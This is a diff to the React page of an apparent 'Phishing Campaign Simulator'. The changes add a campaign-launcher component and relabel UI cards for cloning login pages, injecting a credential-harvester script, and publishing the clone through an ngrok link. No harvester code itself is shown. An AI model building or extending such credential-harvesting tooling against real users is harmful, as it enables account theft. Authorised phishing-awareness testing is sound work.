@@ -20,6 +20,7 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
 import { startNgrokTunnel } from '@/services/ngrok-service';
+import { PhishingCampaignLauncher } from '@/components/phishing-campaign-launcher';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -276,14 +277,16 @@ export default function PhishingPage() {
     <div className="flex flex-col gap-6">
       <div>
         <h1 className="font-headline text-3xl font-semibold">Phishing Campaign Simulator</h1>
-        <p className="text-muted-foreground">Clone login pages and manage credential harvesting campaigns.</p>
+        <p className="text-muted-foreground">Clone login pages, run campaigns, and manage credential harvesting.</p>
       </div>
+
+      <PhishingCampaignLauncher />
       
       <div className="grid lg:grid-cols-2 gap-6 items-start">
         <div className="flex flex-col gap-6">
             <Card>
                 <CardHeader>
-                <CardTitle>1. Page Cloner</CardTitle>
+                <CardTitle>Page Cloner & Harvester Setup</CardTitle>
                 <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                 </CardHeader>
                 <Form {...form}>
@@ -345,7 +348,7 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">2. Generate Public Link</CardTitle>
+                        <CardTitle className="text-xl">Generate Public Link</CardTitle>
                         <div className="w-full flex gap-2">
                         <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                            {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
